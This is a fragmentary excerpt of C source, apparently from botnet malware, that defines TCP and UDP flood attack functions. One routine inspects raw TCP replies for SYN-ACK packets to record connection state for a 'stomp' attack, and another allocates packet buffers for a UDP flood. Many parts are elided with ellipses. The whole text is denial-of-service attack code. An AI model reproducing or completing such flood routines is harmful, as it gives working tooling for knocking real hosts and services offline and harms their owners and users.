...
void attack_tcp_flood(uint32_t port, uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, rfd;
            ...
            if (recv_addr.sin_addr.s_addr == addr.sin_addr.s_addr && ret > (sizeof (struct iphdr) + sizeof (struct tcphdr)))
            {
                ...
                if (tcph->source == addr.sin_port)
                {
                    if (tcph->syn && tcph->ack)
                    {
                        ...
                        stomp_data[i].port = addr.sin_port;
#ifdef DEBUG
...
void attack_udp_flood(uint32_t port, uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
#ifdef DEBUG
    printf("Start UDP Flood.\n");
#endif
    int i;
    char **pkts = calloc(targs_len, sizeof (char *));
